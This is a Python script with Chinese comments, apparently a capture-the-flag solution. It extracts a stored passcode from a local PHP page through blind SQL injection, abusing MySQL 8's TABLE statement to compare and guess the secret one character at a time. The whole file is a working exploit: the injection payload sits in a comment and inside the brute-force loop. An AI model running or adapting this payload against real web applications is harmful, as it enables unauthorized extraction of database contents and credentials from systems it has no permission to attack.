#根据MySQL8的新特性爆破得到passcode
import requests

#payload示例，passcode=' || ('Z')<=(table passcodes limit 1) || '1'='2


def get_passcode(payload):
    url = "http://127.0.0.1:58581/check_code.php"  # 确保URL格式正确
    data = {
        "passcode": payload
    }
    try:
        response = requests.post(url, data=data)
        return response.text
    except requests.RequestException as e:
        print(f"请求失败: {e}")
        return ""

#爆破passcode,('*')<=(table passcodes limit 1)中*号是需要爆破的字符串，遍历字符，一位一位的爆破，直到得到passcode
def brute_force_passcode():
    chars ='0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~'
    print(f"爆破字符集: {chars}")
    passcode = ""
    found = False
    priv_char = ''

    while not found:
        found = True
        for char in chars:
            payload = f"' || ('{passcode+char}')<=(table passcodes limit 1) || '1'='2&Submit=Submit"
            response = get_passcode(payload)
            if "YOU ARE CHEATING" not in response:
                passcode += priv_char
                priv_char = char
                print(f"找到正确字符: {passcode}")
                found = False
                if(char == '0'):
                    found = True
                break
            else:
                priv_char = char

    return passcode

# 调用brute_force_passcode函数开始爆破
passcode=brute_force_passcode()
#最后一个是多余的字符，去掉
passcode = passcode[:-1]
print(passcode)
print("爆破完成")